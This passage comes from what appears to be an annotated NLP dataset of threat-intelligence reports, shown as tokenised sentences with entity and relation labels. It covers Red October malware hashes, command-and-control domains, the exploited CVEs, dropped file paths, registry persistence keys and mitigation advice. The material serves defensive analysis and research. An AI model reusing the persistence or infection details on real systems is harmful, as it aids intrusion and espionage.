"97576FA7A236679DBE3ABE1A4E852026"], ["C1EC435E97A4A4C5585392D738B5879F"], ["2559FE4EB88561138CE292DF5D0E099F"], ["0ABF3FA976372CBC8BF33162795E42A8", "0B3B1E2E22C548D8F53C2AA338ABD66E", "0AA7B256D2DCC8BD3914F895B134B225"], ["FF8E19CA8A224CC843BF0F2F74A3274E"], ["7C5272F3F24ACB225270DDED72CFC1D4"], ["8AEAA0C81A36449EC9613CA846E196F2", "2AAD951DBECB6D4715B306B337CA5C34", "926235FCF7B91442A405B5760A0729EB"], ["963BFAE19B3DA5BECE081DFF1D1E3EF9", "EBC9BDF9FDF0A9773899D96D24AC46F4", "998F30457BC48A1A6567203E0EC3282E", "31F96ADD841594D35E6E97376114E756"], ["6E416C45A833F959A63785892042595A", "0DC102CFB87C937EEFFE01A06F94E229"], ["B7DF947B4A67A884C751840F83C4405E", "2EB1503751A7C74890096B1837C7BD81", "C21D7165B25CAF65D7F92FF758C1B5B1", "0A67F9CC30083AFB7E1F8295AE152BB6", "E9823B61E6CE999387DE821DFBF6E741", "2AAD951DBECB6D4715B306B337CA5C34", "ED53831468DDF4220E1DC3C3398F7F39", "66DDF27517985A75B2317231B46A6F62", "86BE5F0D2303FB4A8A8E297A53AC0026"], ["D14E0A3D408065B1551F2827B50B83CA", "B6C8A6D6C35428779C5C65C1B273EBA0", "C03B5985F2504939DA9874246A439E25", "216689B2CA82F16A0CAB3A2712C27DA6", "9C39D6F52E1E1BE5AE61BAB90971D054", "E7E05001A294EBFE8A012DD3BCE78E96"], ["F68F85B0FBCA450F0D5C8828063AD30D"], ["3DA8C22F5340850EE5A2C25B1D17FC27", "9D144A828F757A90B86976EF0C906B3F", "DBE2AC744A3947B6306E13EBCCB718BF"], ["861C90536B3B5A4A8309ADBBFD5C4713", "947557A55267DFFB3F85E0D7496A3679", "2BFE41D7FDB6F4C1E38DB4A5C3EB1211"], ["2BCDC5091C446E8B6888D802A3589E09"], ["72FD6074915F8F123EB44B3DD475D36B"], ["41454B390B73A45004B916B96C693312", "Primary", "C&C", "hint.zapto.org", "natco4.no-ip.net", "hint1.zapto.org"], ["mjed10.no-ip.info", "monagameel.chickenkiller.com", "powerhost.zapto.org", "powerhost.zapto.org", "hint.zapto.org", "hint.zapto.org", "powerhost.zapto.org", "flashsoft.no-ip.biz", "menu.dyndns.biz", "mjed10.no-ip.info"], ["helpme.no-ip.biz", "hint.zapto.org", "powerhost.zapto.org", "powerhost.zapto.org", "hint.zapto.org", "hint.zapto.org", "powerhost.zapto.org", "hint.zapto.org", "menu.dyndns.biz", "skype.servemp3.com"], ["skype.servemp3.com"], ["good.zapto.org", "good.zapto.org", "natco1.no-ip.net", "natco1.no-ip.net", "lokia.mine.nu", "lokia.mine.nu", "menu.dyndns.biz", "lokia.mine.nu", "natco2.no-ip.net", "natco3.no-ip.net", "may2008.dyndns.biz", "menu.dyndns.biz", "loading.myftp.org", "lokia.mine.nu", "lokia.mine.nu", "natco3.no-ip.net", "good.zapto.org", "loading.myftp.org", "loading.myftp.org", "idf.blogsite.org"], ["javaupdate.no-ip.info", "Red", "hash", "=", "probable", "PS", "target", "."], ["Blue", "hash", "=", "probable", "IL", "target", "."], ["\u00a9", "Norman", ",", "November", "2012", "C&C", "loc", "."], ["PS", "PS", "PS", "PS", "PS", "PS", "PS", "PS", "PS", "PS", "PS", "PS", "PS", "PS", "US", "PS", "PS", "FR", "PS", "PS", "UK", "PS", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "US", "Date", "first", "seen", "27", "-", "Oct-11"], ["29", "-", "Oct-11", "02", "-", "Nov-11", "07", "-", "Nov-11"], ["07", "-", "Nov-11"], ["08", "-", "Nov-11"], ["14", "-", "Nov-11", "19", "-", "Nov-11"], ["30", "-", "Nov-11"], ["17", "-", "Dec-11", "23", "-", "Dec-11", "01", "-", "Jan-12"], ["03", "-", "Jan-12", "12", "-", "May-12", "16", "-", "May-12", "19", "-", "May-12", "29", "-", "May-12", "02", "-", "Jun-12", "02", "-", "Jun-12", "07", "-", "Jun-12", "09", "-", "Jun-12", "09", "-", "Jun-12", "25", "-", "Jun-12", "25", "-", "Jun-12", "10", "-", "Jul-12", "12", "-", "Jul-12", "02", "-", "Aug-12", "02", "-", "Aug-12", "14", "-", "Aug-12", "29", "-", "Aug-12", "04", "-", "Sep-12", "10", "-", "Sep-12", "18", "-", "Sep-12", "27", "-", "Sep-12", "28", "-", "Sep-12", "02", "-", "Oct-12", "03", "-", "Oct-12", "21", "-", "Oct-12", "21", "-", "Oct-12", "24", "-", "Oct-12", "25", "-", "Oct-12", "25", "-", "Oct-12", "25", "-", "Oct-12", "31", "-", "Oct-12", "03", "-", "Nov-12", "24", "Appendix", "C", ":", "MD5", "list", ",", "main", "cluster"], ["MD5"], ["A5DE87646EE943CD1F448A67FDBE2817", "F982401E46864F640BCAEDC200319109"], ["EC5B360F5FF6251A08A14A2E95C4CAA4", "97576FA7A236679DBE3ABE1A4E852026"], ["C1EC435E97A4A4C5585392D738B5879F"], ["2559FE4EB88561138CE292DF5D0E099F"], ["0ABF3FA976372CBC8BF33162795E42A8", "1f1e9958440d773c34415d9eb6334b25", "0B3B1E2E22C548D8F53C2AA338ABD66E", "0AA7B256D2DCC8BD3914F895B134B225"], ["B455426811B82CB412952F63D911D2A8", "E431634699D7E5025ECDF7B51A800620", "FF8E19CA8A224CC843BF0F2F74A3274E"], ["7C5272F3F24ACB225270DDED72CFC1D4"], ["8AEAA0C81A36449EC9613CA846E196F2"], ["FC17F3B2E2C7F5F24D35899D95B8C4A6", "926235FCF7B91442A405B5760A0729EB"], ["963BFAE19B3DA5BECE081DFF1D1E3EF9", "EBC9BDF9FDF0A9773899D96D24AC46F4", "4A06D9989A8C3A9967C2011E5BAF3010"], ["4DC0BCDCFB3F3D794175B21872A76079", "998F30457BC48A1A6567203E0EC3282E", "91FC9D1B635FDEE4E56AEC32688A0E6C", "940B3ACDF1E26FCCCF74A5A0359FB079", "cebc8b51d51e442e2af8c86e70c8adf4", "31F96ADD841594D35E6E97376114E756", "6E416C45A833F959A63785892042595A"], ["0DC102CFB87C937EEFFE01A06F94E229"], ["B7DF947B4A67A884C751840F83C4405E", "2EB1503751A7C74890096B1837C7BD81", "C21D7165B25CAF65D7F92FF758C1B5B1", "0A67F9CC30083AFB7E1F8295AE152BB6", "15FC009D9CAAA8F11D6C3DA2B69EA06E", "D9D1B0C467FA4999DEF6CD53447F1221", "E9823B61E6CE999387DE821DFBF6E741", "2AAD951DBECB6D4715B306B337CA5C34", "ED53831468DDF4220E1DC3C3398F7F39"], ["66DDF27517985A75B2317231B46A6F62", "86BE5F0D2303FB4A8A8E297A53AC0026"], ["A1187DE4C4B88E560D46940B820A6228", "\u00a9", "Norman", ",", "November", "2012", "D14E0A3D408065B1551F2827B50B83CA", "B6C8A6D6C35428779C5C65C1B273EBA0", "841565C67006E6A0A450C48054CF348C"], ["C8202523F35295E8BC8CC1731EDB0559"], ["C03B5985F2504939DA9874246A439E25", "216689B2CA82F16A0CAB3A2712C27DA6"], ["5B740B4623B2D1049C0036A6AAE684B0", "9C39D6F52E1E1BE5AE61BAB90971D054", "E7E05001A294EBFE8A012DD3BCE78E96"], ["F68F85B0FBCA450F0D5C8828063AD30D"], ["3DA8C22F5340850EE5A2C25B1D17FC27", "9D144A828F757A90B86976EF0C906B3F", "DBE2AC744A3947B6306E13EBCCB718BF"], ["861C90536B3B5A4A8309ADBBFD5C4713", "947557A55267DFFB3F85E0D7496A3679", "2BFE41D7FDB6F4C1E38DB4A5C3EB1211"], ["2BCDC5091C446E8B6888D802A3589E09", "72FD6074915F8F123EB44B3DD475D36B"], ["41454B390B73A45004B916B96C693312", "25"]]}, {"vertexSet": [[{"name": "McAfee", "pos": [0, 1], "sent_id": 0, "type": "Organization"}], [{"name": "Red October", "pos": [1, 3], "sent_id": 1, "type": "Campaign"}], [{"name": "January 18, 2013", "pos": [3, 7], "sent_id": 1, "type": "Time"}], [{"name": "Red October", "pos": [1, 3], "sent_id": 3, "type": "Campaign"}], [{"name": "2009", "pos": [16, 17], "sent_id": 4, "type": "Time"}], [{"name": "51EDEA56C1E83BCBC9F873168E2370AF", "pos": [8, 9], "sent_id": 17, "type": "MD5"}], [{"name": "Red October", "pos": [1, 3], "sent_id": 18, "type": "Campaign"}], [{"name": "CVE-2012-0158", "pos": [14, 17], "sent_id": 18, "type": "Vulnerability"}], [{"name": "CVE-2010-3333", "pos": [22, 25], "sent_id": 18, "type": "Vulnerability"}], [{"name": "CVE-2009-3129", "pos": [30, 33], "sent_id": 18, "type": "Vulnerability"}], [{"name": "CVE-2011-3544", "pos": [38, 41], "sent_id": 18, "type": "Vulnerability"}], [{"name": "Red October", "pos": [12, 14], "sent_id": 19, "type": "Campaign"}], [{"name": "CVE-2012-0158", "pos": [4, 7], "sent_id": 20, "type": "Vulnerability"}], [{"name": "CVE-2010-3333", "pos": [8, 11], "sent_id": 20, "type": "Vulnerability"}], [{"name": "CVE-2009-3129", "pos": [12, 15], "sent_id": 20, "type": "Vulnerability"}], [{"name": "phishing email", "pos": [1, 3], "sent_id": 21, "type": "Email"}], [{"name": "malicious office document", "pos": [8, 11], "sent_id": 21, "type": "File"}], [{"name": "msmx21.exe", "pos": [19, 20], "sent_id": 22, "type": "Payload"}], [{"name": "msmx21.exe", "pos": [12, 13], "sent_id": 24, "type": "Payload"}], [{"name": "%Temp%\\msc.bat", "pos": [8, 10], "sent_id": 25, "type": "File"}], [{"name": "%ProgramFiles%\\Windows NT\\svchost.exe", "pos": [10, 13], "sent_id": 25, "type": "File"}], [{"name": "%ProgramFiles%\\Windows NT\\wsdktr.ltp", "pos": [13, 16], "sent_id": 25, "type": "Payload"}], [{"name": "Russia", "pos": [9, 10], "sent_id": 27, "type": "Country"}], [{"name": "wsdktr.ltp", "pos": [13, 14], "sent_id": 28, "type": "Payload"}], [{"name": "nt-windows-online.com", "pos": [0, 1], "sent_id": 32, "type": "Indicator"}], [{"name": "nt-windows-update.com", "pos": [0, 1], "sent_id": 33, "type": "Indicator"}], [{"name": "nt-windows-check.com", "pos": [0, 1], "sent_id": 34, "type": "Indicator"}], [{"name": "csrss-check-new.com", "pos": [0, 1], "sent_id": 35, "type": "Indicator"}], [{"name": "CVE-2011-3544", "pos": [5, 8], "sent_id": 35, "type": "Vulnerability"}], [{"name": "%Temp%\\ tmp42e76b5f.bat", "pos": [10, 13], "sent_id": 38, "type": "File"}], [{"name": "%Application Data%\\Keucot\\ qagi.exe", "pos": [17, 21], "sent_id": 38, "type": "File"}], [{"name": "%Application Data%\\ Okurp \\ dezaa.ufy", "pos": [25, 31], "sent_id": 38, "type": "File"}], [{"name": "29f2aad01fee3663.com", "pos": [3, 4], "sent_id": 47, "type": "Indicator"}], [{"name": "McAfee", "pos": [0, 1], "sent_id": 48, "type": "Organization"}], [{"name": "CVE-2011-3544", "pos": [6, 9], "sent_id": 48, "type": "Vulnerability"}], [{"name": "CVE\u20102009\u20103129", "pos": [7, 8], "sent_id": 51, "type": "Vulnerability"}], [{"name": "CVE\u20102010\u20103333", "pos": [0, 1], "sent_id": 52, "type": "Vulnerability"}], [{"name": "CVE\u20102012\u20100158", "pos": [1, 2], "sent_id": 52, "type": "Vulnerability"}], [{"name": "CVE\u20102011\u20103544", "pos": [4, 5], "sent_id": 52, "type": "Vulnerability"}], [{"name": "Aug 2012", "pos": [7, 9], "sent_id": 53, "type": "Time"}], [{"name": "Dec 2012", "pos": [10, 12], "sent_id": 53, "type": "Time"}], [{"name": "update Windows and third-party application security patches", "pos": [4, 13], "sent_id": 58, "type": "CourseOfAction"}], [{"name": "proper filtering rules", "pos": [22, 25], "sent_id": 58, "type": "CourseOfAction"}], [{"name": "Disable AutoPlay", "pos": [0, 2], "sent_id": 63, "type": "CourseOfAction"}]], "labels": [{"r": "P9", "h": 15, "t": 16, "evidence": [21]}, {"r": "P34", "h": 41, "t": 6, "evidence": [18, 58]}, {"r": "P34", "h": 42, "t": 6, "evidence": [18, 58]}, {"r": "P34", "h": 43, "t": 6, "evidence": [18, 63]}], "title": "201301McAfeeRedOctober", "sents": [["McAfee", "Labs", "Threat", "Advisory"], ["Operation", "Red", "October", "January", "18", ",", "2013"], ["Summary"], ["\u201c", "Red", "October", "\u201d", "is", "a", "targeted", "attack", "and", "cyber", "espionage", "network", "that", "was", "discovered", "to", "be", "targeting", "Diplomatic", "and", "Government", "agencies", "."], ["The", "threats", "that", "were", "used", "in", "this", "attack", "campaign", "have", "been", "known", "to", "be", "active", "since", "2009", "."], ["This", "targeted", "attack", "involves", "both", "MS", "-", "office", "and", "Java", "based", "exploits", "."], ["The", "payloads", "used", "in", "the", "exploitation", "are", "mostly", "backdoors", "and", "password", "stealers", "that", "steal", "the", "user", "\u2019s", "information", "and", "send", "it", "in", "an", "encrypted", "form", "to", "the", "remote", "attacker", "."], ["Detailed", "information", "about", "the", "infection", ",", "its", "propagation", ",", "and", "mitigation", "are", "in", "the", "following", "sections", ":", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "Infection", "and", "Propagation", "Vectors", "Characteristics", "and", "Symptoms", "Exploit", "HeatMap"], ["Restart", "Mechanism"], ["Getting", "Help", "from", "the", "McAfee", "Foundstone", "Services", "team", "Infection", "and", "Propagation", "Vectors"], ["The", "exploits", "used", "in", "the", "targeted", "attack", "are", "sent", "to", "the", "users", "through", "spear", "phishing", "e", "-", "mails", "that", "contain", "crafted", "malicious", "documents", "as", "attachments", ",", "and", "a", "malicious", "link", "embedded", "in", "the", "e", "-", "mail", "that", "leads", "to", "a", "compromised", "website", "."], ["Once", "the", "user", "opens", "the", "malicious", "document", "containing", "the", "embedded", "code", ",", "a", "malicious", "payload", "is", "dropped", "into", "the", "system", "."], ["The", "dropped", "payload", "in", "turn", "communicates", "with", "the", "C&C", "servers", "."], ["The", "payload", "receives", "additional", "modules", "from", "the", "C&C", "server", "to", "handle", "the", "infection", "on", "different", "types", "of", "devices", "and", "also", "could", "drop", "additional", "malware", "."], ["Characteristics", "and", "Symptoms"], ["Description"], ["There", "could", "be", "different", "combinations", "of", "Microsoft", "and", "Java", "exploits", "and", "payload", "in", "the", "wild", "to", "achieve", "this", "attack", "."], ["We", "have", "used", "one", "of", "the", "MD5s", "(", "51EDEA56C1E83BCBC9F873168E2370AF", ")", "to", "do", "this", "analysis", ",", "which", "is", "a", "document", "file", "."], ["The", "Red", "October", "campaign", "is", "known", "to", "target", "the", "following", "mentioned", "vulnerabilities", ":", "\uf0b7", "CVE-2012", "-", "0158", "(", "MS", "Word", ")", "\uf0b7", "CVE-2010", "-", "3333", "(", "MS", "Word", ")", "\uf0b7", "CVE-2009", "-", "3129", "(", "MS", "Excel", ")", "\uf0b7", "CVE-2011", "-", "3544", "(", "Java", "Rhino", "Script", "Engine", "Vulnerability", ")"], ["The", "following", "picture", "clearly", "shows", "how", "the", "targeted", "attack", "happens", "in", "the", "Red", "October", "Campaign", "."], ["Microsoft", "Document", "Exploitation", "(", "CVE-2012", "-", "0158", ",", "CVE-2010", "-", "3333", ",", "CVE-2009", "-", "3129", "):"], ["The", "phishing", "email", "contains", "an", "attachment", "with", "the", "malicious", "office", "document", "."], ["This", "file", ",", "when", "opened", ",", "exploits", "one", "of", "the", "above", "mentioned", "vulnerabilities", "and", "drops", "the", "payload", "file", "\u201c", "msmx21.exe", "\u201d", "."], ["Payload", "Information", ":"], ["After", "successful", "exploitation", "of", "the", "vulnerability", ",", "the", "embedded", "executable", "file", "(", "msmx21.exe", ")", "is", "dropped", "in", "the", "%", "temp%", "folder", "."], ["msmx21.exe", "creates", "and", "executes", "the", "following", "files", ":", "%", "Temp%\\msc.bat", "%", "ProgramFiles%\\Windows", "NT\\svchost.exe", "%", "ProgramFiles%\\Windows", "NT\\wsdktr.ltp", "(", "Encrypted", "payload", ")", "-", ">", "random", "name"], ["The", "dropped", "batch", "file", "has", "the", "following", "content", ":", "The", "use", "of", "\u201c", "chcp", "1251", "\u201d", "in", "the", "batch", "file", "is", "to", "switch", "the", "codepage", "of", "an", "infected", "system", "to", "handle", "Cyrillic", "characters", "."], ["This", "might", "suggest", "that", "either", "the", "attack", "originates", "from", "Russia", "or", "was", "also", "targeted", "towards", "government", "agencies", "in", "Russia", "."], ["Svchost.exe", "is", "an", "installer", "component", "that", "decrypts", "and", "loads", "the", "main", "backdoor", "(", "wsdktr.ltp", ")", "."], ["It", "connects", "to", "the", "following", "Microsoft", "hosts", "to", "check", "for", "a", "live", "Internet", "connection", ":", "update.microsoft.com", "www.microsoft.com", "support.microsoft.com", "wsdktr.ltp", "is", "an", "encrypted", "executable", "file", "(", "UPX", "packed", "dll", ")", "that", "is", "decrypted", "and", "loaded", "into", "memory", "by", "svchost.exe", "."], ["Encrypted", "wsdktr.ltp", "file", ":", "Decrypted", "file", ":", "The", "decrypted", "file", "is", "responsible", "for", "the", "communication", "between", "the", "infected", "machine", "and", "C&C", "server", "as", "shown", "in", "the", "following", "image", "."], ["The", "following", "domains", "are", "used", "for", "C&C", ":"], ["nt-windows-online.com"], ["nt-windows-update.com"], ["nt-windows-check.com"], ["csrss-check-new.com", "Exploitation", "Using", "Java", "(", "CVE-2011", "-", "3544", "):"], ["In", "Java", "Rhino", "Script", "Engine", "Vulnerability", ",", "security", "manager", "is", "disabled", "during", "JavaScript", "execution", ",", "which", "would", "enable", "full", "permission", "to", "the", "system", "during", "its", "execution", "."], ["When", "the", "user", "clicks", "the", "link", "that", "came", "through", "the", "spam", "mail", ",", "the", "exploit", "would", "be", "triggered", "on", "the", "vulnerable", "system", "."], ["The", "downloaded", "payload", "creates", "and", "executes", "the", "following", "files", ":", "%", "Temp%\\", "tmp42e76b5f.bat", "-", ">", "random", "name", "%", "Application", "Data%\\Keucot\\", "qagi.exe", "-", ">", "random", "name", "%", "Application", "Data%\\", "Okurp", "\\", "dezaa.ufy-", ">", "random", "name", "(", "encrypted", "content", ")"], ["The", "following", "debugged", "code", "shows", "the", "batch", "being", "created", "while", "execution", "."], ["The", "batch", "file", "has", "the", "following", "content", ":", "The", "payload", "injects", "itself", "to", "the", "running", "system", "processes", "in", "the", "machine", "."], ["They", "also", "monitor", "the", "browser", "activities", "in", "the", "targeted", "browsers", "(", "Chrome", ",", "Firefox", ",", "Safari", ",", "and", "IE", ")", "."], ["The", "above", "picture", "shows", "the", "changes", "made", "to", "the", "configuration", "file", "so", "that", "cookies", "wo", "n\u2019t", "be", "cleared", "when", "the", "user", "shuts", "down", "the", "system", "."], ["Also", "warning", "messages", "wo", "n\u2019t", "be", "displayed", "when", "the", "user", "visits", "the", "malicious", "or", "insecure", "pages", "."], ["Malicious", "threads", "injected", "to", "the", "processes", "monitor", "the", "user", "\u2019s", "activities", "and", "collect", "the", "information", "about", "the", "Outlook", "contacts", "and", "browser", "cookies", ",", "along", "with", "the", "system", "information", "."], ["The", "collected", "information", "is", "stored", "as", "an", "encrypted", "content", "and", "sent", "to", "the", "command", "&", "control", "server", "."], ["Some", "of", "these", "exploits", "download", "Ransomware", "and", "Zbot", "payloads", "."], ["C&C", "Server", ":", "29f2aad01fee3663.com"], ["McAfee", "has", "coverage", "for", "this", "exploit", "CVE-2011", "-", "3544", "and", "detects", "the", "downloaded", "payload", "used", "in", "the", "targeted", "attack", "as", "BackDoor", "-", "FJJ", "."], ["Exploit", "Heat", "Map"], ["The", "following", "statistics", "show", "the", "usage", "of", "the", "vulnerabilities", "in", "the", "targeted", "attack", "in", "the", "last", "quarter", "."], ["Exploits", "5", "%", "2", "%", "7", "%", "CVE\u20102009\u20103129"], ["CVE\u20102010\u20103333", "CVE\u20102012\u20100158", "86", "%", "CVE\u20102011\u20103544", "Exploits", "Statistics"], ["Targeted", "on", "Companies", "and", "Government", "Organizations", "(", "Aug", "2012", "\u2013", "Dec", "2012", ")", "."], ["Restart", "Mechanism", "Description"], ["The", "following", "registry", "entry", "would", "enable", "the", "Trojan", "to", "execute", "every", "time", "when", "Windows", "starts", "."], ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows", "NT\\CurrentVersion\\Winlogon", "\"", "Userinit", "\"", "\"", "C:\\WINDOWS\\system32\\userinit.exe,\"\"C:\\WINDOWS\\system32\\userinit.exe", ",", "C:\\Program", "Files", "\\WindowsNT\\svchost.exe", "\"", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Zeemav", ":", "\"", "\"", "C:\\Documents", "and", "Settings\\Home\\Application", "Data\\Keucot\\qagi.exe", "\"", "\"", "Mitigation"], ["Users", "are", "requested", "to", "exercise", "caution", "while", "opening", "unsolicited", "emails", "and", "unknown", "links", "."], ["Users", "are", "advised", "to", "update", "Windows", "and", "third", "-", "party", "application", "security", "patches", "and", "virus", "definitions", "on", "a", "regular", "basis", "and", "have", "proper", "filtering", "rules", "."], ["\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "Use", "Access", "Protection", "Rules", "from", "accessing", "such", "run", "keys", "."], ["Please", "keep", "your", "anti", "-", "virus", "updated", "."], ["Keep", "software", "up", "-", "to", "-", "date", "with", "the", "latest", "available", "patches", "."], ["It", "is", "advisable", "to", "use", "your", "firewall", "to", "monitor", "unusual", "traffic", "."], ["Disable", "AutoPlay", "to", "prevent", "the", "automatic", "launching", "of", "executable", "files", "on", "network", "and", "removable", "drives", "."], ["Getting", "Help", "from", "the", "McAfee", "Foundstone", "Services", "team"], ["This", "document", "is", "intended", "to", "provide", "a", "summary", "of", "current", "intelligence", "and", "best", "practices", "to", "ensure", "the", "highest", "level", "of", "protection", "from", "your", "McAfee", "security", "solution", "."], ["The", "McAfee", "Foundstone", "Services", "team", "offers", "a", "full", "range", "of", "strategic", "and", "technical", "consulting", "services", "that", "can", "further", "help", "to", "ensure", "you", "identify", "security", "risk", "and", "build", "effective", "solutions", "to", "remediate", "security", "vulnerabilities", "."], ["You", "can", "reach", "them", "here", ":", "https://secure.mcafee.com/apps/services/services-contact.aspx", "\u00a9", "2011", "McAfee", ",", "Inc."], ["All", "rights", "reserved", "."]]}, {"vertexSet": [[{"name": "Red October", "pos": [2, 4], "sent_id": 0, "type": "Campaign"}], [{"name": "Eastern Europe", "pos": [18, 20], "sent_id": 6, "type": "Region"}], [{"name": "Central Asia", "pos": [27, 29], "sent_id": 6, "type": "Region"}], [{"name": "Western Europe", "pos": [33, 35], "sent_id": 6, "type": "Region"}], [{"name": "North America", "pos": [36, 38], "sent_id": 6, "type": "Region"}], [{"name": "Rocra", "pos": [6, 7], "sent_id": 7, "type": "Campaign"}], [{"name": "Red October", "pos": [12, 14], "sent_id": 7, "type": "Campaign"}], [{"name": "Flame", "pos": [44, 45], "sent_id": 7, "type": "Malware"}], [{"name": "May 2007", "pos": [25, 27], "sent_id": 8, "type": "Time"}], [{"name": "CVE-2009-3129", "pos": [16, 19], "sent_id": 18, "type": "Vulnerability"}], [{"name": "CVE-2010-3333", "pos": [24, 27], "sent_id": 18, "type": "Vulnerability"}], [{"name": "CVE-2012-0158", "pos": [32, 35], "sent_id": 18, "type": "Vulnerability"}], [{"name": "2010", "pos": [14, 15], "sent_id": 19, "type": "Time"}], [{"name": "2011", "pos": [16, 17], "sent_id": 19, "type": "Time"}], [{"name": "summer of 2012", "pos": [28, 31], "sent_id": 19, "type": "Time"}], [{"name": "Tibetan activists", "pos": [21, 23], "sent_id": 20, "type": "ExploitTargetObject"}], [{"name": "MS08-067", "pos": [26, 29], "sent_id": 23, "type": "Vulnerability"}], [{"name": "Rocra", "pos": [5, 6], "sent_id": 45, "type": "Campaign"}], [{"name": "October 2012", "pos": [8, 10], "sent_id": 45, "type": "Time"}], [{"name": "Switzerland", "pos": [27, 28], "sent_id": 53, "type": "Country"}], [{"name": "Luxembourg", "pos": [29, 30], "sent_id": 53, "type": "Country"}], [{"name": "RUSSIAN FEDERATION", "pos": [30, 32], "sent_id": 54, "type": "Country"}], [{"name": "KAZAKHSTAN", "pos": [33, 34], "sent_id": 54, "type": "Country"}], [{"name": "AZERBAIJAN", "pos": [35, 36], "sent_id": 54, "type": "Country"}], [{"name": "BELGIUM", "pos": [37, 38], "sent_id": 54, "type": "Country"}], [{"name": "INDIA", "pos": [39, 40], "sent_id": 54, "type": "Country"}], [{"name": "AFGHANISTAN", "pos": [1, 2], "sent_id": 55, "type": "Country"}], [{"name": "ARMENIA", "pos": [3, 4], "sent_id": 55, "type": "Country"}], [{"name": "IRAN", "pos": [5, 6], "sent_id": 55, "type": "Country"}], [{"name": "TURKMENISTAN", "pos": [11, 12], "sent_id": 55, "type": "Country"}], [{"name": "UKRAINE", "pos": [13, 14], "sent_id": 55, "type": "Country"}], [{"name": "UNITED STATES", "pos": [15, 17], "sent_id": 55, "type": "Country"}], [{"name": "BELARUS", "pos": [21, 22], "sent_id": 55, "type": "Country"}], [{"name": "GREECE", "pos": [23, 24], "sent_id": 55, "type": "Country"}], [{"name": "ITALY", "pos": [25, 26], "sent_id": 55, "type": "Country"}], [{"name": "MOROCCO", "pos": [27, 28], "sent_id": 55, "type": "Country"}], [{"name": "PAKISTAN", "pos": [29, 30], "sent_id": 55, "type": "Country"}], [{"name": "SWITZERLAND", "pos": [31, 32], "sent_id": 55, "type": "Country"}], [{"name": "UGANDA", "pos": [33, 34], "sent_id": 55, "type": "Country"}], [{"name": "UNITED ARAB EMIRATES", "pos": [35, 38], "sent_id": 55, "type": "Country"}], [{"name": "PROGA", "pos": [3, 4], "sent_id": 68, "type": "Indicator"}], [{"name": "MPTraitor", "pos": [12, 13], "sent_id": 71, "type": "Indicator"}], [{"name": "conn_a", "pos": [25, 26], "sent_id": 71, "type": "Indicator"}], [{"name": "European Union", "pos": [30, 32], "sent_id": 74, "type": "Organization"}], [{"name": "NATO", "pos": [33, 34], "sent_id": 74, "type": "Organization"}], [{"name": "MS08-067", "pos": [48, 51], "sent_id": 85, "type": "Vulnerability"}], [{"name": "Rocra", "pos": [4, 5], "sent_id": 86, "type": "Campaign"}], [{"name": "Microsoft Outlook", "pos": [8, 10], "sent_id": 99, "type": "Software"}], [{"name": "Oracle DB", "pos": [30, 32], "sent_id": 101, "type": "Software"}], [{"name": "RAdmin", "pos": [33, 34], "sent_id": 101, "type": "Software"}], [{"name": "Mail.Ru agent", "pos": [38, 42], "sent_id": 101, "type": "Software"}], [{"name": "MS08-067", "pos": [15, 18], "sent_id": 108, "type": "Vulnerability"}], [{"name": "Windows Mobile", "pos": [17, 19], "sent_id": 111, "type": "ExploitTargetObject"}], [{"name": "iPhone", "pos": [0, 1], "sent_id": 112, "type": "ExploitTargetObject"}], [{"name": "Nokia", "pos": [1, 2], "sent_id": 112, "type": "ExploitTargetObject"}], [{"name": "Flame", "pos": [2, 3], "sent_id": 122, "type": "Malware"}], [{"name": "Gauss", "pos": [4, 5], "sent_id": 122, "type": "Malware"}], [{"name": "Aurora", "pos": [10, 11], "sent_id": 125, "type": "Campaign"}], [{"name": "Night Dragon", "pos": [12, 14], "sent_id": 125, "type": "Campaign"}], [{"name": "Rocra", "pos": [1, 2], "sent_id": 130, "type": "Campaign"}], [{"name": "Russia", "pos": [11, 12], "sent_id": 134, "type": "Country"}], [{"name": "Germany", "pos": [13, 14], "sent_id": 134, "type": "Country"}], [{"name": "114ed0e5298149fc69f6e41566e3717a", "pos": [0, 1], "sent_id": 155, "type": "MD5"}], [{"name": "1f86299628bed519718478739b0e4b0c", "pos": [0, 1], "sent_id": 156, "type": "MD5"}], [{"name": "2672fbba23bf4f5e139b10cacc837e9f", "pos": [1, 2], "sent_id": 156, "type": "MD5"}], [{"name": "350c170870e42dce1715a188ca20d73b", "pos": [0, 1], "sent_id": 157, "type": "MD5"}], [{"name": "396d9e339c1fd2e787d885a688d5c646", "pos": [1, 2], "sent_id": 157, "type": "MD5"}], [{"name": "3ded9a0dd566215f04e05340ccf20e0c", "pos": [2, 3], "sent_id": 157, "type": "MD5"}], [{"name": "44e70bce66cdac5dc06d5c0d6780ba45", "pos": [3, 4], "sent_id": 157, "type": "MD5"}], [{"name": "4bfa449f1a351210d3c5b03ac2bd18b1", "pos": [0, 1], "sent_id": 158, "type": "MD5"}], [{"name": "4ce5fd18b1d3f551a098bb26d8347ffb", "pos": [1, 2], "sent_id": 158, "type": "MD5"}], [{"name": "4daa2e7d3ac1a5c6b81a92f4a9ac21f1", "pos": [2, 3], "sent_id": 158, "type": "MD5"}], [{"name": "50bd553568422cf547539dd1f49dd80d", "pos": [3, 4], "sent_id": 158, "type": "MD5"}], [{"name": "51edea56c1e83bcbc9f873168e2370af", "pos": [4, 5], "sent_id": 158, "type": "MD5"}], [{"name": "5d1121eac9021b5b01570fb58e7d4622", "pos": [0, 1], "sent_id": 159, "type": "MD5"}], [{"name": "5ecec03853616e13475ac20a0ef987b6", "pos": [0, 1], "sent_id": 160, "type": "MD5"}], [{"name": "5f9b7a70ca665a54f8879a6a16f6adde", "pos": [0, 1], "sent_id": 161, "type": "MD5"}], [{"name": "639760784b3e26c1fe619e5df7d0f674", "pos": [1, 2], "sent_id": 161, "type": "MD5"}], [{"name": "65d277af039004146061ff01bb757a8f", "pos": [0, 1], "sent_id": 162, "type": "MD5"}], [{"name": "6b23732895daaad4bd6eae1d0b0fef08", "pos": [1, 2], "sent_id": 162, "type": "MD5"}], [{"name": "731c68d2335e60107df2f5af18b9f4c9", "pos": [2, 3], "sent_id": 162, "type": "MD5"}], [{"name": "7e5d9b496306b558ba04e5a4c5638f9f", "pos": [0, 1], "sent_id": 163, "type": "MD5"}], [{"name": "82e518fb3a6749903c8dc17287cebbf8", "pos": [1, 2], "sent_id": 163, "type": "MD5"}], [{"name": 